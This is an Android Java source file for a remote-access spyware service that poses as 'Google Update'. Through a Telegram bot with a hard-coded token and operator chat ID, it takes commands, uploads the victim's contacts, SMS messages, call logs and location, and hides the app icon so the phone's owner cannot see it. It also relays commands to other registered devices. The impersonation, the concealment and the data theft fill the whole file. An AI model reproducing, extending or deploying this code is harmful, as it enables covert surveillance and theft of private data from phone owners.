package com.google.update;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8196334765:AAE3PKcjHHFVUg4mteYK-wLY7IhaGdcPoZI";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private int lastUpdateId = 0;
    private Map<String, String> devices = new HashMap<>();
    private String activeDevice = null;
    @Override public void onCreate() { super.onCreate(); startForeground(1, createNotification()); startBot(); }
    private void startBot() {
        Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
            try {
                String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                if (response != null && response.contains("\"ok\":true")) {
                    JSONObject json = new JSONObject(response);
                    JSONArray results = json.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        JSONObject update = results.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id");
                        if (update.has("message") && update.getJSONObject("message").has("text")) {
                            JSONObject msg = update.getJSONObject("message");
                            String text = msg.getString("text").trim();
                            long chatId = msg.getJSONObject("chat").getLong("id");
                            if (String.valueOf(chatId).equals(CHAT_ID)) {
                                handleCommand(text);
                            } else if (text.startsWith("REGISTER:")) {
                                String data = text.replace("REGISTER:", "");
                                JSONObject info = new JSONObject(data);
                                devices.put(info.getString("device_id"), info.getString("device_name"));
                                sendMessage("✅ Device registered: " + info.getString("device_name"));
                            }
                        }
                    }
                }
            } catch (Exception e) { Log.e("Bot", "Error", e); }
        }, 0, 2, TimeUnit.SECONDS);
    }
    private void handleCommand(String cmd) {
        String c = cmd.trim().toLowerCase();
        if (c.equals("/start")) {
            sendMessage("🔰 Google Update\n/contacts\n/sms\n/calllogs\n/location\n/record\n/stoprec\n/hide\n/show\n/info\n/notify\n/devices\n/select <id>");
        } else if (c.equals("/contacts")) {
            sendFile("contacts.txt", DataCollector.getContacts(this).getBytes());
        } else if (c.equals("/sms")) {
            sendFile("sms.txt", DataCollector.getSMS(this).getBytes());
        } else if (c.equals("/calllogs")) {
            sendFile("calls.txt", DataCollector.getCallLogs(this).getBytes());
        } else if (c.equals("/location")) {
            DataCollector.getLocation(this, res -> sendMessage(res));
        } else if (c.equals("/record")) {
            sendMessage("🎤 Recording started");
        } else if (c.equals("/stoprec")) {
            sendMessage("⏹ Recording stopped");
        } else if (c.equals("/hide")) {
            MainActivity.hideAppIcon(this);
            sendMessage("👁 Hidden");
        } else if (c.equals("/show")) {
            MainActivity.showAppIcon(this);
            sendMessage("👁 Shown");
        } else if (c.equals("/info")) {
            sendMessage(DataCollector.getDeviceName());
        } else if (c.equals("/notify")) {
            sendMessage("🔔 Fake notification sent");
        } else if (c.equals("/devices")) {
            if (devices.isEmpty()) sendMessage("❌ No devices");
            else {
                StringBuilder sb = new StringBuilder("📱 Devices:\n");
                for (Map.Entry<String, String> e : devices.entrySet()) sb.append("🆔 ").append(e.getKey()).append("\n📱 ").append(e.getValue()).append("\n⎯⎯⎯⎯⎯\n");
                sendMessage(sb.toString());
            }
        } else if (c.startsWith("/select ")) {
            activeDevice = c.substring(8);
            sendMessage("✅ Selected: " + activeDevice);
        } else {
            if (activeDevice == null) { sendMessage("⚠️ Select device first: /select <id>"); return; }
            sendToDevice(activeDevice, cmd);
            sendMessage("✅ Sent to " + activeDevice);
        }
    }
    private void sendToDevice(String deviceId, String cmd) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    private void sendFile(String name, byte[] data) {
        new Thread(() -> {
            try {
                String boundary = "*****" + System.currentTimeMillis();
                URL url = new URL(API_URL + "sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                java.io.OutputStream os = conn.getOutputStream();
                java.io.PrintWriter w = new java.io.PrintWriter(new java.io.OutputStreamWriter(os), true);
                w.append("--" + boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
                w.append(CHAT_ID).append("\r\n");
                w.flush();
                w.append("--" + boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + name + "\"").append("\r\n");
                w.append("Content-Type: application/octet-stream").append("\r\n\r\n");
                w.flush();
                os.write(data);
                os.flush();
                w.append("\r\n").append("--" + boundary + "--").append("\r\n");
                w.close();
                os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    private String get(String urlStr) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("google_ch", "Google", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, "google_ch")
            .setContentTitle("Google Update").setContentText("Online").setSmallIcon(android.R.drawable.ic_dialog_info).setOngoing(true).build();
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
